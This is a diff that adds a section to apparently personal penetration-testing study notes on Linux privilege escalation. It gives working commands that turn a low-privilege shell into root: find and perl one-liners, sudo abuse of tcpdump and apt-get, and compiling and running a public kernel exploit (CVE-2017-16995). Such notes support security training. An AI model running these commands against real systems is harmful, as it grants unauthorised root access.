@@ -376,3 +376,183 @@ $ su root2
 # id
 uid=0(root) gid=0(root) groups=0(root)
 ```
+
+## Insecure System Components
+
+### Abusing Setuid Binaries and Capabilities
+
+When a user or a system-automated script launches a process, it inherits the UID/GID of its initiating script (the real UID/GID). The UID/GID is the actual value checked when performing sensitive operations.
+
+```console
+// leave this on standby
+$ passwd
+Changing password for joe.
+Current password: 
+
+// open another shell as joe
+$ ps u -C passwd
+root      1359  0.0  0.1   9364  3148 pts/0    S+   14:40   0:00 passwd
+
+// so passwd service runs as root
+
+// use the PID from above output
+$ grep Uid /proc/1359/status
+Uid:    1000    0       0       0
+// real, effective, saved set, and filesystem UIDs
+/ usually, all four would belong to same user who launched the exe
+// the password binary is different becuase it has a special flag, Set-User-ID, or SUID
+
+$ ls -asl /usr/bin/passwd
+64 -rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
+// notice the suid "s" flag
+// this flag can be configured with "chmod u+s <filename>" which sets the UID of the running process to the executable owner's User ID (here - root's UID).
+```
+
+Imagine, after enum, we know the find utility is misconfigged to have the SUID flag set. Run the find program and instruct find to perform an action using -exec. We will execute a bash shell with the Set Builtin -p param that prevents the effective user from being reset.
+
+```console
+$ find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
+# bash-5.0# whoami
+root
+```
+
+Notice that the UID still belongs to Joe but the effective UID is root.
+
+We can also use Linux Capabilities to escalate privileges. Capabilities are extra attributes that can be applied to processes, binaries, and services and assign specific privileges normally reserved for admin operations, like traffic capturing or adding kernel modules. Similar to setuid binaries, misconfigurations can allow privilege escalation.
+
+```console
+// back as joe
+// find binaries with capabilities using getcap with -r for recursive search from root / folder.
+$ /usr/sbin/getcap -r / 2>/dev/null
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+/usr/bin/perl5.28.1 = cap_setuid+ep
+/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+
+// notice the two perl binaries with setuid enabled and +ep flag indicating the capabilities are effective and permitted.
+```
+
+Check [GTFOBins](https://gtfobins.github.io/) to see if we can exploit. The site will provide you the precise command to use to conduct an exploit.
+
+```console
+$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+# whoami
+root
+```
+
+### Abusing Sudo
+
+Our low privileged user needs to be a member of the sudo group (on Debian-based distros). Custom perms are in /etc/sudoers. See what your user can do.
+
+```console
+$ sudo -l
+Matching Defaults entries for joe on debian-privesc:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User joe may run the following commands on debian-privesc:
+    (ALL) (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
+```
+
+Since the first of the three permitted commands does not allow us to edit any crontab, it's unlikely that we could use this to find any escalation route. Let's go for the second - tcpdump.
+
+The GTFOBins for this one gives an error.
+
+```console
+$ COMMAND='id'
+
+$ TF=$(mktemp)
+
+$ echo "$COMMAND" > $TF
+
+$ chmod +x $TF
+
+$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+[sudo] password for joe:
+dropped privs to root
+tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
+...
+compress_savefile: execlp(/tmp/tmp.c5hrJ5UrsF, /dev/null) failed: Permission denied
+
+// find the culprit
+
+$ cat /var/log/syslog | grep tcpdump
+Aug 29 02:52:14 debian-privesc kernel: [ 5742.171462] audit: type=1400 audit(1661759534.607:27): apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump" name="/tmp/tmp.c5hrJ5UrsF" pid=12280 comm="tcpdump" requested_mask="x" denied_mask="x" fsuid=0 ouid=1000
+```
+
+The audit daemon logged our privilege escalation attempt and AppArmor blocked it! AppArmor is a kernel module that does Manatory Access Control on Linux, and is default-enabled on Debian 10. You can verify the status:
+
+```console
+$ su - root
+$ aa-status
+```
+
+Let's try the third sudoers option - /usr/bin/apt-get - using the GTFObin.
+
+```console
+$ sudo apt-get changelog apt
+!/bin/sh
+```
+
+### Exploiting Kernel Vulnerabilities
+
+Success on Kernel Exploits may depend on matching the kernel version and OS flavor of the target. Gain information about our target first.
+
+```console
+// system id
+$ cat /etc/issue
+
+// kernel version
+$ uname -r
+
+// system architecture
+$ arch
+```
+
+Find an exploit:
+
+```console
+$ searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
+
+Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                                             | linux/local/45010.c
+```
+
+When compiling, keep in mind you need to match the architecture of your target. This is especially important in situations where the target machine does not have a compiler and we are forced to compile the exploit on our attacking machine or in a sandboxed environment that replicates the target OS and architecture.
+
+```console
+$ cp /usr/share/exploitdb/exploits/linux/local/45010.c .
+
+// look at firs 30 lines to see if there are compilation instructions
+$ head 45010.c -n 20
+...
+ gcc cve-2017-16995.c -o cve-2017-16995
+...
+
+// easy enough
+$ mv 45010.c cve-2017-16995.c
+
+// transfer exploit code to target
+$ scp cve-2017-16995.c joe@192.168.123.216:
+
+// go to joe's terminal
+
+// make joe compile
+joe$ gcc cve-2017-16995.c -o cve-2017-16995
+
+// check Linux ELF file architecture
+joe$ file cve-2017-16995
+
+// run!
+$ ./cve-2017-16995
+# whoami
+root
+```
+
+Extra Examples:
+
+Vulnerable to CVE-2021-4034 - Pkexec Local Privilege Escalation Use [PwnKit](https://github.com/ly4k/PwnKit).
+
+Hints:
+
+Check for cron jobs that run hourly. See if you have write permissions to their SCRIPTS (.sh).
+When you find a binary with the SUID flag set, search for it in https://gtfobins.github.io/.
